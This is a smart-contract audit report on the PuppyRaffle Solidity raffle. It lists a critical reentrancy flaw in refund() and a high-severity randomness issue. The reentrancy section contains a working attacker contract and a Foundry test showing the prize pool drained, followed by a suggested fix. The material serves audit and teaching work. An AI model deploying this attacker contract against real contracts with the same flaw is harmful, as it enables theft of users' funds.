# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle Protocol**

PuppyRaffle is a self-contained Ethereum raffle that awards a randomly generated Puppy NFT and an ether prize.  
• **Entry:** Anyone calls `enterRaffle(address[] players)` paying `entranceFee` for each address. The contract rejects duplicate addresses and emits `RaffleEnter` for transparency.  
• **Refunds:** Before the draw, a player may call `refund(index)` to reclaim their fee; only the caller’s own index is accepted.  
• **Lifecycle:** A raffle starts on deployment and runs for `raffleDuration` seconds. When the timer expires and ≥4 active players exist, anyone may invoke `selectWinner()`.  
• **Winner Selection:** A pseudo-random index (using block data) is chosen, `previousWinner` is recorded, an NFT is minted, and funds are distributed: 80 % of the pot to the winner, 20 % to `feeAddress`. State is then reset for the next round.  
• **Protocol Fees:** Collected fees accumulate in `totalFees`. The owner can `withdrawFees()` (only when no active players) or change the `feeAddress`.  
• **Metadata:** NFTs store rarity and image URIs entirely on-chain via `tokenURI`.  
Overall, PuppyRaffle provides a low-friction, transparent lottery with built-in refunds, fee sharing, and perpetual rounds—all in <200 lines of Solidity.
## Critical Risk Findings
[C-1]. Reentrancy issue found with Critical severity
## High Risk Findings
[H-1]. Randomness issue found with High severity


### Number of Findings
- C: 1
- H: 1
- M: 0
- L: 0
- I: 0



# Critical Risk Findings

## [C-1]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function follows the 'calls before state updates' pattern, a violation of the Checks-Effects-Interactions (CEI) principle. It transfers the `entranceFee` back to the player using `sendValue` (which uses a low-level `.call`) before updating the `players` array to nullify the player's entry. A malicious contract can exploit this by re-entering the `refund` function from its `receive()` or `fallback()` function. Each re-entrant call will pass the initial checks because the player's state has not been updated, allowing the attacker to repeatedly withdraw the `entranceFee` until the contract's balance is drained.

## Impact
A malicious actor can create a contract to enter the raffle and then call `refund` to drain the entire prize pool, stealing all funds from other participants. This results in a total loss of funds for the raffle.

## Proof of Concept
pragma solidity 0.7.6;

/*
1. Any user (or previous rounds) leaves ETH inside PuppyRaffle. For demo we force-fund it with vm.deal().
2. Attacker buys ONE raffle ticket.
3. During the first refund() call the contract sends the ticket price before it marks the player as refunded.
4. The attacker re-enters refund() from its receive() function as long as the raffle still owns >= entranceFee wei.
5. Each nested call passes the same "playerIndex" check because the array slot is not zeroed yet.
6. The loop stops only when the contract balance becomes < entranceFee, effectively draining every wei that belonged to honest players.
*/
contract Attacker {
    PuppyRaffle public raffle;
    uint256 public reentered;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function attack() external payable {
        // Buy exactly one ticket
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: raffle.entranceFee()}(players);

        uint256 idx = raffle.getActivePlayerIndex(address(this));
        raffle.refund(idx); // first refund – starts the re-entrancy cascade
    }

    receive() external payable {
        if (address(raffle).balance >= raffle.entranceFee()) {
            reentered++;
            uint256 idx = raffle.getActivePlayerIndex(address(this));
            raffle.refund(idx);
        }
    }
}


## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyRefundTest is Test {
    PuppyRaffle raffle;
    Attacker attacker;

    uint256 constant ENTRANCE_FEE = 0.1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xBEEF), 1 days);

        // Pretend other players already deposited 5 ether
        vm.deal(address(raffle), 5 ether);

        attacker = new Attacker(raffle);
        vm.deal(address(attacker), 1 ether);
    }

    function testDrainViaReentrancy() public {
        uint256 balanceBefore = address(raffle).balance;

        vm.startPrank(address(attacker));
        attacker.attack{value: ENTRANCE_FEE}();
        vm.stopPrank();

        uint256 balanceAfter = address(raffle).balance;
        uint256 attackerProfit = address(attacker).balance - (1 ether - ENTRANCE_FEE); // subtract ticket cost

        assertEq(balanceAfter, 0, "raffle should be emptied");
        assertEq(attackerProfit, balanceBefore, "attacker stole the whole pool");
        assertTrue(attacker.reentered() > 0, "re-entrancy occurred");
    }
}

// Minimal attacker from PoC
contract Attacker {
    PuppyRaffle public raffle;
    uint256 public reentered;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: raffle.entranceFee()}(players);
        uint256 idx = raffle.getActivePlayerIndex(address(this));
        raffle.refund(idx);
    }

    receive() external payable {
        if (address(raffle).balance >= raffle.entranceFee()) {
            reentered++;
            uint256 idx = raffle.getActivePlayerIndex(address(this));
            raffle.refund(idx);
        }
    }
}

## Suggested Mitigation
Move `players[playerIndex] = address(0);` to *before* the ETH transfer and/or add `ReentrancyGuard` to the contract so that refund() is protected with the `nonReentrant` modifier. Both changes guarantee that a re-entrant refund() call will fail the `playerAddress != address(0)` check, fully eliminating the vulnerability.



